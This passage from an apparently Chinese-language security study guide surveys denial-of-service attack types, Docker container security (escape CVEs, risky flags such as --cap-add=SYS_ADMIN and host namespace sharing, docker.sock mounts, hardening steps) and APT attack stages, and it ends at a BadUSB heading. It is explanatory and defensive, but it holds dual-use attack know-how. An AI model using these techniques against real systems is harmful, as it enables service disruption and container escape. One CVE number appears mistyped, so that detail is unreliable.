<li><a class="reference external" href="https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-PAPER.pdf">Black Hat Unicode Security</a></li>
<li><a class="reference external" href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/">Request encoding to bypass web application firewalls</a></li>
<li><a class="reference external" href="https://shkspr.mobi/blog/2018/11/domain-hacks-with-unusual-unicode-characters/">domain hacks with unusual unicode characters</a></li>
<li><a class="reference external" href="https://zhuanlan.zhihu.com/p/53714077">其实你并不懂 Unicode</a></li>
</ul>
</div>
</div>
</div>
<span id="document-misc/dos"></span><div class="section" id="id1">
<h3>拒绝服务攻击<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>DoS（Denial of Service）指拒绝服务，是一种常用来使服务器或网络瘫痪的网络攻击手段。</p>
<p>在平时更多提到的是分布式拒绝服务（DDoS，Distributed Denial of Service） 攻击，该攻击是指利用足够数量的傀儡计算机产生数量巨大的攻击数据包，对网络上的一台或多台目标实施DDoS攻击，成倍地提高威力，从而耗尽受害目标的资源，迫使目标失去提供正常服务的能力。</p>
</div>
<div class="section" id="udp">
<h4>UDP反射<a class="headerlink" href="#udp" title="永久链接至标题">¶</a></h4>
<p>基于UDP文的反射DDoS攻击是拒绝服务攻击的一种形式。攻击者不直接攻击目标，而是利用互联网中某些开放的服务器，伪造被攻击者的地址并向该服务器发送基于UDP服务的特殊请求报文，使得数倍于请求报文的数据被发送到被攻击IP，从而对后者间接形成DDoS攻击。</p>
<p>常用于DoS攻击的服务有:</p>
<ul class="simple">
<li>NTP</li>
<li>DNS</li>
<li>SSDP</li>
<li>Memcached</li>
</ul>
<p>其中DNS攻击主要是指DNS Request Flood、DNS Response Flood、虚假源+真实源DNS Query Flood、权威服务器攻击和Local服务器攻击。</p>
</div>
<div class="section" id="tcp-flood">
<h4>TCP Flood<a class="headerlink" href="#tcp-flood" title="永久链接至标题">¶</a></h4>
<p>TCP Flood是一种利用TCP协议缺陷的攻击，这种方式通过伪造IP向攻击服务器发送大量伪造的TCP SYN请求，被攻击服务器回应握手包后（SYN+ACK），因为伪造的IP不会回应之后的握手包，服务器会保持在SYN_RECV状态，并尝试重试。这会使得TCP等待连接队列资源耗尽，正常业务无法进行。</p>
</div>
<div class="section" id="shrew-ddos">
<h4>Shrew DDoS<a class="headerlink" href="#shrew-ddos" title="永久链接至标题">¶</a></h4>
<p>Shrew DDoS利用了TCP的重传机制，调整攻击周期来反复触发TCP协议的RTO，达到攻击的效果。其数据包以固定的、恶意选择的慢速时间发送，这种模式能够将TCP流量限制为其理想速率的一小部分，同时以足够低的平均速率进行传输以避免检测。</p>
<p>现代操作系统已经对TCP协议进行了相应的修改，使得其不受影响。</p>
</div>
<div class="section" id="ping-of-death">
<h4>Ping Of Death<a class="headerlink" href="#ping-of-death" title="永久链接至标题">¶</a></h4>
<p>在正常情况下不会存在大于65536个字节的ICMP包，但是报文支持分片重组机制。通过这种方式可以发送大于65536字节的ICMP包并在目标主机上重组，最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。</p>
<p>现代操作系统已经对这种攻击方式进行检查，使得其不受影响。</p>
</div>
<div class="section" id="challenge-collapsar-cc">
<h4>Challenge Collapsar (CC)<a class="headerlink" href="#challenge-collapsar-cc" title="永久链接至标题">¶</a></h4>
<p>CC攻击是一种针对资源的DoS攻击，攻击者通常会常用请求较为消耗服务器资源的方式来达到目的。</p>
<p>CC攻击的方式有很多种，常见的攻击可以通过大量访问搜索页、物品展示页等消耗大的功能来实现。部分HTTP服务器也可通过上传超大文件、发送大量且复杂的参数的请求来实现攻击。</p>
</div>
<div class="section" id="id3">
<h4>慢速攻击<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>HTTP慢速攻击是由Wong Onn Chee 和 Tom Brennan在2012年的OWASP大会上正式披露，用低速发包来消耗服务器资源以达到拒绝服务的目的。</p>
<p>慢速攻击分为 Slow headers / Slow body / Slow read 三种攻击方式。Slow headers 一直不停的慢速发送HTTP头部，消耗服务器的连接和内存资源。Slow body 发送一个 Content-Length 很大的 HTTP POST请求，每次只发送很少量的数据，使该连接一直保持存活。Slow read以很低的速度读取Response。</p>
</div>
<div class="section" id="id4">
<h4>基于服务特性<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>压缩包解压</dt>
<dd><ul class="first last">
<li>巨大的0字节的压缩包</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>读文件</dt>
<dd><ul class="first last">
<li>读 <code class="docutils literal notranslate"><span class="pre">/dev/urandom</span></code> 等无限制的文件</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>受限制的反序列化</dt>
<dd><ul class="first last">
<li>反序列化巨大的数组</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>正则解析</dt>
<dd><ul class="first last">
<li>消耗巨大的回溯表达式</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h4>常用的防护方式<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>基于特定攻击的指纹检测攻击，对相应流量进行封禁/限速操作</li>
<li>对正常流量进行建模，对识别出的异常流量进行封禁/限速操作</li>
<li>基于IP/端口进行综合限速策略</li>
<li>基于地理位置进行封禁/限速操作</li>
</ul>
</div>
<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://linuxacademy.com/howtoguides/posts/show/topic/13191-denial-of-service-dos">linux academy dos</a></li>
<li><a class="reference external" href="https://github.com/shekyan/slowhttptest">slowhttptest</a> Application Layer DoS attack simulator</li>
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Slowloris_(computer_security)">Slowloris wiki</a></li>
</ul>
</div>
</div>
<span id="document-misc/docker"></span><div class="section" id="docker">
<h3>Docker<a class="headerlink" href="#docker" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>虚拟化技术与容器技术<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>传统虚拟化技术<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>传统虚拟化技术通过添加hypervisor层，虚拟出网卡，内存，CPU等虚拟硬件，再在其上建立客户机，每个客户机都有自己的系统内核。传统虚拟化技术以虚拟机为管理单元，各虚拟机拥有独立的操作系统内核，不共用宿主机的软件系统资源，因此具有良好的隔离性，适用于云计算环境中的多租户场景。</p>
</div>
<div class="section" id="id3">
<h5>容器技术<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>容器技术可以看作一种轻量级的虚拟化方式，容器技术在操作系统层进行虚拟化，可在宿主机内核上运行多个虚拟化环境。相比于传统的应用测试与部署，容器的部署无需预先考虑应用的运行环境兼容性问题；相比于传统虚拟机，容器无需独立的操作系统内核就可在宿主机中运行，实现了更高的运行效率与资源利用率。</p>
</div>
</div>
<div class="section" id="id4">
<h4>Docker<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>Docker是目前最具代表性的容器平台之一，具有持续部署与测试、跨云平台支持等优点。在基于Kubernetes等容器编排工具实现的容器云环境中，通过对跨主机集群资源的调度，容器云可提供资源共享与隔离、容器编排与部署、应用支撑等功能。</p>
<div class="section" id="id5">
<h5>基本概念<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>Docker有三个基本概念，镜像（Image）、容器（Container）、仓库（Repository）。镜像是一个只读的模版，由一组文件系统通过Union FS技术组成。</p>
<p>镜像是静态的定义，容器是从镜像创建的运行实例。容器的本质是进程，拥有自己独立的命名空间。</p>
<p>仓库（Repository） 是集中存放镜像文件的场所，用于存储、分发镜像。</p>
<p>容器可以被启动、开始、停止、删除，每个容器都是相互隔离的，可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p>
</div>
<div class="section" id="id6">
<h5>组成<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>Docker引擎由如下主要组件构成：Docker客户端（Docker Client）、Docker守护进程（Docker daemon）、containerd以及runc，它们共同负责容器的创建和运行。</p>
<p>Docker Client是和Docker Daemon建立通信客户端，Docker Client可以通过http/unix socket等方式Daemon建立通信。</p>
<p>Docker Daemon在宿主机运行，作为服务端接受来自客户端的请求，主要功能包括镜像管理、镜像构建、REST API、身份验证、安全、核心网络以及编排。Docker daemon通过位于 <code class="docutils literal notranslate"><span class="pre">/var/run/docker.sock</span></code> 的本地 IPC/Unix socket 来实现Docker远程API，默认非TLS网络端口为2375，TLS默认端口为2376。</p>
</div>
<div class="section" id="id7">
<h5>数据<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>Docker的数据主要分为持久化和非持久化数据，默认情况下非持久化存储是自动创建生命周期与容器相同，删除容器也会删除非持久化数据，在Linux环境下，非持久化数据默认存储于 <code class="docutils literal notranslate"><span class="pre">/var/lib/docker/</span></code> 下。</p>
</div>
<div class="section" id="id8">
<h5>网络<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>Docker网络架构源自一种叫作容器网络模型的方案，主要由CNM、Libnetwork、网络驱动构程。</p>
</div>
</div>
<div class="section" id="id9">
<h4>安全风险与安全机制<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<p>在考虑Docker安全性的时候主要考虑以下几点</p>
<ul class="simple">
<li>内核本身的安全性及其对命名空间和cgroups的支持</li>
<li>Docker守护进程本身的攻击面</li>
<li>内核的“强化”安全功能以及它们如何与容器进行交互</li>
</ul>
<div class="section" id="id10">
<h5>Docker安全基线<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<p><img alt="benchsec" src="images/docker-sec-bench.png" /></p>
</div>
<div class="section" id="namespace">
<h5>内核命名空间/namespace<a class="headerlink" href="#namespace" title="永久链接至标题">¶</a></h5>
<p>Docker容器与LXC容器非常相似，并且具有相似的安全特性。当使用docker运行启动容器时，Docker会在后台为容器创建一组命名空间和控制组。</p>
<p>命名空间提供了一个最直接的隔离形式：在容器中运行的进程看不到或者无法影响在另一个容器或主机系统中运行的进程。</p>
<p>每个容器也有自己的网络堆栈，这意味着一个容器不能获得对另一个容器的套接字或接口的特权访问。当然，如果主机系统相应设置，容器可以通过各自的网络接口交互。如果为容器指定公共端口或使用链接时，容器之间允许IP通信。</p>
<p>它们可以相互ping通，发送/接收UDP数据包，并建立TCP连接，但是如果需要可以限制它们。从网络体系结构的角度来看，给定Docker主机上的所有容器都位于网桥接口上。这意味着它们就像通过普通的以太网交换机连接的物理机器一样。</p>
</div>
<div class="section" id="control-group">
<h5>Control Group<a class="headerlink" href="#control-group" title="永久链接至标题">¶</a></h5>
<p>控制组是Linux容器的另一个关键组件，主要作用是实施资源核算和限制。</p>
<p>Cgroup 提供了许多有用的度量标准，但也有助于确保每个容器都能获得公平的内存，CPU和磁盘I/O; 更重要的是单个容器不能通过耗尽资源的方式来降低系统的性能。</p>
<p>因此，尽管 Cgroup 不能阻止一个容器访问或影响另一个容器的数据和进程，但它们对于抵御一些拒绝服务攻击是至关重要的。它们对于多租户平台尤其重要，例如公共和私人PaaS，即使在某些应用程序开始行为不当时也能保证一致的正常运行时间（和性能）。</p>
</div>
<div class="section" id="id11">
<h5>守护进程的攻击面<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>使用Docker运行容器意味着运行Docker守护进程，而这个守护进程当前需要root权限，因此，守护进程是需要考虑的一个地方。</p>
<p>首先，只有受信任的用户才能被允许控制Docker守护进程。具体来说，Docker允许您在Docker主机和访客容器之间共享一个目录;它允许你这样做而不限制容器的访问权限。这意味着可以启动一个容器，其中/host目录将成为主机上的/目录，容器将能够不受任何限制地改变主机文件系统。</p>
<p>这具有很强的安全意义：例如，如果通过Web服务器测试Docker以通过API配置容器，则应该更加​​仔细地进行参数检查，以确保恶意用户无法传递制作的参数，从而导致Docker创建任意容器。</p>
<p>守护进程也可能容易受到其他输入的影响，例如从具有docker负载的磁盘或从具有docker pull的网络加载映像。</p>
<p>最终，预计Docker守护进程将运行受限特权，将操作委托给审核良好的子进程，每个子进程都有自己的（非常有限的）Linux功能范围，虚拟网络设置，文件系统管理等。也就是说，很可能，Docker引擎本身的部分将在容器中运行。</p>
</div>
<div class="section" id="capability">
<h5>Capability<a class="headerlink" href="#capability" title="永久链接至标题">¶</a></h5>
<p>默认情况下，Docker采用Capability机制来实现用户在以root身份运行容器的同时，限制部分root的操作。</p>
<p>在大多数情况下，容器不需要真正的root权限。因此，Docker可以运行一个Capability较低的集合，这意味着容器中的root比真正的root要少得多。例如：</p>
<ul class="simple">
<li>否认所有挂载操作</li>
<li>拒绝访问原始套接字（防止数据包欺骗）</li>
<li>拒绝访问某些文件系统操作，如创建新的设备节点，更改文件的所有者或修改属性（包括不可变标志）</li>
<li>拒绝模块加载</li>
<li>其他</li>
</ul>
<p>这意味着，即使入侵者在容器内获取root权限，进一步攻击也会困难很多。默认情况下，Docker使用白名单而不是黑名单，去除了所有非必要的功能。</p>
</div>
<div class="section" id="seccomp">
<h5>Seccomp<a class="headerlink" href="#seccomp" title="永久链接至标题">¶</a></h5>
<p>Docker使用Seccomp来限制容器对宿主机内核发起的系统调用。</p>
</div>
</div>
<div class="section" id="id12">
<h4>攻击面分析<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<div class="section" id="id13">
<h5>供应链安全<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<p>在构建Dockerfile的过程中，即使是使用排名靠前的来源，也可能存在CVE漏洞、后门、镜像污染等问题。</p>
</div>
<div class="section" id="id14">
<h5>虚拟化风险<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<p>虽然Docker通过命名空间进行了文件系统资源的基本隔离，但仍有 <code class="docutils literal notranslate"><span class="pre">/sys</span></code> 、<code class="docutils literal notranslate"><span class="pre">/proc/sys</span></code> 、 <code class="docutils literal notranslate"><span class="pre">/proc/bus</span></code> 、 <code class="docutils literal notranslate"><span class="pre">/dev</span></code> 、<code class="docutils literal notranslate"><span class="pre">time</span></code> 、<code class="docutils literal notranslate"><span class="pre">syslog</span></code> 等重要系统文件目录和命名空间信息未实现隔离，而是与宿主机共享相关资源。</p>
</div>
<div class="section" id="id15">
<h5>利用内核漏洞逃逸<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>CVE-2016-5195</li>
</ul>
</div>
<div class="section" id="id16">
<h5>容器逃逸漏洞<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>CVE-2019-14271 Docker cp</li>
<li>CVE-2019-13139 Docker build code execution</li>
<li><dl class="first docutils">
<dt>CVE-2019-5736 runC</dt>
<dd><ul class="first last">
<li>Docker Version &lt; 18.09.2</li>
<li>Version &lt;= 1.0-rc6</li>
</ul>
</dd>
</dl>
</li>
<li>CVE-2018-18955</li>
</ul>
</div>
<div class="section" id="id17">
<h5>配置不当<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>开启privileged</li>
<li>挂载宿主机敏感目录</li>
<li><dl class="first docutils">
<dt>配置cap不当</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--cap-add=SYS_ADMIN</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>绕过namespace</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--net=host</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--pid=host</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--ipc=host</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id18">
<h5>拒绝服务<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>CPU耗尽</li>
<li>内存耗尽</li>
<li>存储耗尽</li>
<li>网络资源耗尽</li>
</ul>
</div>
<div class="section" id="id19">
<h5>危险挂载<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>挂载 <code class="docutils literal notranslate"><span class="pre">/var/run/docker.sock</span></code></li>
<li>挂载宿主机 <code class="docutils literal notranslate"><span class="pre">/dev</span></code> <code class="docutils literal notranslate"><span class="pre">/proc</span></code> 等危险目录</li>
</ul>
</div>
<div class="section" id="id20">
<h5>攻击 Docker 守护进程<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h5>
<p>虽然 Docker 容器具有很强的安全保护措施，但是 Docker 守护进程本身并没有被完善的保护。Docker 守护进程本身默认由 root 用户运行，并且该进程本身并没有使用 Seccomp 或者 AppArmor 等安全模块进行保护。这使得一旦攻击者成功找到漏洞控制 Docker 守护进程进行任意文件写或者代码执行，就可以顺利获得宿主机的 root 权限而不会受到各种安全机制的阻碍。值得一提的是，默认情况下 Docker 不会开启 User Namespace 隔离，这也意味着 Docker 内部的 root 与宿主机 root 对文件的读写权限相同。这导致一旦容器内部 root 进程获取读写宿主机文件的机会，文件权限将不会成为另一个问题。这一点在 CVE-2019-5636 利用中有所体现。</p>
</div>
<div class="section" id="cve">
<h5>其他CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>CVE-2014-5277</li>
<li>CVE-2014-6408</li>
<li>CVE-2014-9357</li>
<li>CVE-2014-9358</li>
<li>CVE-2015-3627</li>
<li>CVE-2015-3630</li>
</ul>
</div>
</div>
<div class="section" id="id21">
<h4>安全加固<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>最小安装</dt>
<dd><ul class="first last">
<li>删除所有开发工具（编译器等）</li>
</ul>
</dd>
</dl>
</li>
<li>更新系统源</li>
<li>启用 AppArmor</li>
<li>启用 SELinux</li>
<li>限制运行容器的内核功能</li>
<li>移除依赖构建</li>
<li>配置严格的网络访问控制策略</li>
<li>不使用root用户启动docker</li>
<li>不以privileged特权模式运行容器</li>
<li><dl class="first docutils">
<dt>控制资源</dt>
<dd><ul class="first last">
<li>CPU Share</li>
<li>CPU 核数</li>
<li>内存资源</li>
<li>IO 资源</li>
<li>磁盘资源</li>
<li>硬件资源</li>
</ul>
</dd>
</dl>
</li>
<li>使用安全的基础镜像</li>
<li>定期安全扫描和更新补丁</li>
<li><dl class="first docutils">
<dt>删除镜像中的 setuid 和 setgid 权限</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">RUN</span> <span class="pre">find</span> <span class="pre">/</span> <span class="pre">-perm</span> <span class="pre">+6000-type</span> <span class="pre">f-exec</span> <span class="pre">chmod</span> <span class="pre">a-s</span> <span class="pre">{}</span> <span class="pre">\;||</span> <span class="pre">true</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>配置Docker守护程序的TLS身份验证</li>
<li>如非必要 禁止容器间通信</li>
<li><dl class="first docutils">
<dt>rootless Docker</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://get.docker.com/rootless">https://get.docker.com/rootless</a></li>
</ul>
</dd>
</dl>
</li>
<li>使用 Seccomp 限制 syscall</li>
<li>构建环境和在线环境分开</li>
<li>证书校验</li>
</ul>
</div>
<div class="section" id="id22">
<h4>Docker 环境识别<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h4>
<div class="section" id="id23">
<h5>Docker内<a class="headerlink" href="#id23" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>MAC地址为 <code class="docutils literal notranslate"><span class="pre">02:42:ac:11:00:00</span></code> - <code class="docutils literal notranslate"><span class="pre">02:42:ac:11:ff:ff</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">ps</span> <span class="pre">aux</span></code> 大部分运行的程序 pid 都很小</li>
<li><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/proc/1/cgroup</span></code> docker的进程</li>
<li>docker 环境下存在 <code class="docutils literal notranslate"><span class="pre">.dockerenv</span></code></li>
<li>部分容器中缺少许多常用的命令如 <code class="docutils literal notranslate"><span class="pre">ping</span></code> 等</li>
</ul>
</div>
<div class="section" id="id24">
<h5>Docker外<a class="headerlink" href="#id24" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">/var/run/docker.sock</span></code> 文件存在</li>
<li><code class="docutils literal notranslate"><span class="pre">2375</span></code> / <code class="docutils literal notranslate"><span class="pre">2376</span></code> 端口开启</li>
</ul>
</div>
</div>
<div class="section" id="id25">
<h4>参考链接<a class="headerlink" href="#id25" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://blog.heroku.com/exploration-of-security-when-building-docker-containers">A House of Cards An Exploration of Security When Building Docker Containers</a></li>
<li><a class="reference external" href="http://obrown.io/2016/02/15/privileged-containers.html">Privileged Docker Containers</a></li>
<li><a class="reference external" href="https://kitctf.de/writeups/32c3ctf/docker">32c3 docker writeup</a></li>
<li><a class="reference external" href="https://blog.qiniu.com/archives/7743">打造安全的容器云平台</a></li>
<li><a class="reference external" href="https://docs.docker.com/engine/security/security/">Docker security</a></li>
<li><a class="reference external" href="http://blog.nsfocus.net/docker-mirror-security/">容器安全</a></li>
<li><a class="reference external" href="https://strm.sh/post/abusing-insecure-docker-deployments/">CVE-2017-7494 Docker沙箱逃逸</a></li>
<li><a class="reference external" href="https://www.freebuf.com/articles/system/221319.html">Docker容器安全性分析</a></li>
<li><a class="reference external" href="https://docs.docker.com/engine/security/apparmor/">AppArmor security profiles for Docker</a></li>
<li><a class="reference external" href="https://github.com/docker/docker-bench-security">Docker Bench for Security</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/d9D3z13uCOJoJzplpu3WJQ">Docker安全性与攻击面分析</a></li>
<li>Pfleeger C P , Pfleeger S L , Theofanos M F . A methodology for penetration testing[J]. Computers &amp; Security, 1989, 8(7):613-620.</li>
</ul>
</div>
</div>
<span id="document-misc/apt"></span><div class="section" id="apt">
<h3>APT<a class="headerlink" href="#apt" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>APT (Advanced Persistent Threat)，翻译为高级持续威胁。2006年，APT攻击的概念被正式提出，用来描述从20世纪90年代末到21世纪初在美国军事和政府网络中发现的隐蔽且持续的网络攻击。</p>
<p>APT攻击多用于指利用互联网进行网络间谍活动，其目标大多是获取高价值的敏感情报或者控制目标系统，对目标系统有着非常严重的威胁。</p>
<p>发起APT攻击的通常是一个组织，其团体是一个既有能力也有意向持续而有效地进行攻击的实体。个人或者小团体发起的攻击一般不会被称为APT，因为即使其团体有意图攻击特定目标，也很少拥有先进和持久的资源来完成相应的攻击行为。</p>
<p>APT的攻击手段通常包括供应链攻击、社会工程学攻击、零日攻击和僵尸网络等多种方式。其基于这些攻击手段将将自定义的恶意代码放置在一台或多台计算机上执行特定的任务，并保持在较长的时间内不被发现。</p>
<p>和传统的大面积扫描的攻击方式不同，因为APT攻击通常只面向单一特定的目标，且多数攻击会综合一系列手段来完成一次APT攻击，使其有着非常高的隐蔽性和复杂性，让对APT攻击的检测变得相当困难。顾名思义，APT的特征主要体现在下面这三个方面。</p>
</div>
<div class="section" id="advanced">
<h4>高级性（Advanced）<a class="headerlink" href="#advanced" title="永久链接至标题">¶</a></h4>
<p>APT攻击会结合当前所有可用的攻击手段和技术，使得攻击具有极高的隐蔽性和渗透性。</p>
<p>网络钓鱼就是其中的一种攻击方式。攻击者通常会结合社会工程学等手段来伪造可信度非常高的电子邮件，冒充目标信任的公司或者组织来发送难以分辨真假的对目标诱惑度很高恶意电子邮件。通过这些邮件来诱使被受害者访问攻击者控制的网站或者下载恶意代码。</p>
<p>APT攻击通常还会采用其他的方式来伪装自己的攻击行为，从而实现规避安全系统检测的目的。比如有的恶意代码会通过伪造合法签名来逃避杀毒软件检测。以震网病毒为例，其在攻击时就使用了白加黑的模式，利用合法的证书对其代码进行了签名，这种攻击方式会使得大部分恶意代码查杀引擎会直接认为恶意代码是合法的，而不进行任何的检测。</p>
<p>除了利用合法签名绕过检测，APT攻击者在攻击过程中也经常利用第三方的站点作为媒介来攻击目标，而不是使用传统的点到点攻击模式。这种模式通常被称为水坑攻击。</p>
<p>水坑攻击是一种入侵的手法，一般来说，是在攻击者对目标有一定了解后，确定攻击目标经常访问的网站，而后入侵其中的一个或几个网站，并对这些网站植入恶意代码，最后来实现借助该网站感染目标的能力。因为这种攻击借助了目标信任的第三方网站，攻击的成功率相对钓鱼攻击来说要高出很多。</p>
<p>另外一个能体现APT攻击高级性的特征是零日漏洞，目前国际上黑市一个零日漏洞的价格在数十万到数百万不等，每一个零日漏洞的稳定利用都需要大量的资源投入。而在APT攻击中，零日漏洞的利用非常广泛。以APT28为例，据统计，仅2015年一年当中APT28在攻击中就至少使用了六个零日漏洞。</p>
</div>
<div class="section" id="persistent">
<h4>持续性（Persistent）<a class="headerlink" href="#persistent" title="永久链接至标题">¶</a></h4>
<p>和传统的基于短期利益的网络攻击有很大的不同。APT攻击的过程通常包括多个实施阶段。攻击者很很多情况下都是使用逐层渗透的方式来突破高级的防御系统，整个攻击过程一般持续时间会达到几个月甚至数年。一般来说，APT攻击可以分为以下几个阶段。</p>
<div class="section" id="id2">
<h5>侦查阶段<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>为了能够找到目标的脆弱点，攻击者通常会做大量的准备工作。在这个阶段攻击者多会使用基于大数据分析的隐私收集或者基于社会工程学的攻击来收集目标的信息，为了之后的攻击做出充分的准备。</p>
</div>
<div class="section" id="id3">
<h5>初次入侵阶段<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>基于初次侦查的信息，攻击者通常能收集到目标所使用的软件、操作系统系统版本等信息。在获取这些信息后，攻击者可以挖掘软件对应版本的零日漏洞或者使用已知漏洞来对系统做出初期的入侵行为，获取对目标一定的控制权限。</p>
</div>
<div class="section" id="id4">
<h5>权限提升阶段<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>在复杂网络中，攻击者初次入侵所获得的权限通常是较低的权限，而为了进一步的攻击，攻击者需要获取更高的权限来完成其需要的攻击行为。在这个阶段，攻击者通常会使用权限提升漏洞或者爆破密码等行为来实现权限提升的目的，最后获得系统甚至域的管理员权限。</p>
</div>
<div class="section" id="id5">
<h5>保持访问阶段<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>在成功入侵目标计算机并且有一定的权限之后，攻击者一般会使用各种方式来保持对系统的访问权限。其中一个比较常用的方式是窃取合法用户的登录凭证。当获取了用户的访问凭证之后，可以使用远程控制工具（RAT，Remote Access Tools）来建立连接，并在连接建立之后，植入特定的后门来达到持续控制的效果。</p>
</div>
<div class="section" id="id6">
<h5>横向扩展阶段<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>当攻击者掌握一定的目标之后，会以较慢且较隐蔽的方式逐渐在内网扩散。主要方式是先在内网进行一定的侦查。基于这些侦查，获得内网计算机的相关信息，并结合这些信息使用软件漏洞或者弱密码爆破等手段来进行横向的进一步渗透，获取更多的权限和信息。</p>
</div>
<div class="section" id="id7">
<h5>攻击收益阶段<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>APT攻击的主要目的是窃取目标系统的信息或对其造成一定的破坏。在完成横向扩展控制一定的内网机器后。以收集信息为目标的攻击者会使用加密通道的方式把获取的信息逐渐回传并消除入侵痕迹。而以造成破坏为目标的攻击，则在这个阶段进行相应的攻破坏。</p>
</div>
</div>
<div class="section" id="threat">
<h4>威胁性（Threat）<a class="headerlink" href="#threat" title="永久链接至标题">¶</a></h4>
<p>和传统攻击不同，APT攻击的攻击手段和方案大都是针对特定的攻击对象和目的来设计。相对其他攻击，攻击者有着非常明确的目标和目的，很少会使用自动化的攻击方式，而是精确的攻击。</p>
<p>另外APT的目标多是政府机构、金融、能源等敏感企业、部门，一旦这些目标被成功攻击，其影响往往十分巨大。据目前已知的信息，在美国、俄罗斯等国的大选中，以及欧洲一些政治事件中，都有APT攻击出现。APT攻击已经成为国家之前斗争的一种重要手段。</p>
</div>
<div class="section" id="id8">
<h4>相关事件<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>2010年伊朗震网病毒</li>
<li>2013美国棱镜门事件</li>
<li>...</li>
</ul>
</div>
<div class="section" id="ioc">
<h4>IoC<a class="headerlink" href="#ioc" title="永久链接至标题">¶</a></h4>
<p>IoC (Indicators of Compromise) 在取证领域被定义为计算机安全性被破坏的证据。</p>
<p>常见的 IoC 有以下几种：</p>
<ul class="simple">
<li>hash</li>
<li>IP</li>
<li>域名</li>
<li>网络</li>
<li>主机特征</li>
<li>工具</li>
<li>TTPs</li>
</ul>
</div>
<div class="section" id="id9">
<h4>参考链接<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://projectsharp.org/2020/02/23/APT分析及TTPs提取">APT 分析及 TTPs 提取</a></li>
</ul>
</div>
</div>
<span id="document-misc/nearsource"></span><div class="section" id="id1">
<h3>近源渗透<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="usb">
<h4>USB攻击<a class="headerlink" href="#usb" title="永久链接至标题">¶</a></h4>
<div class="section" id="badusb">
<h5>BadUSB<a class="headerlink" href="#badusb" title="永久链接至标题">¶</a></h5>
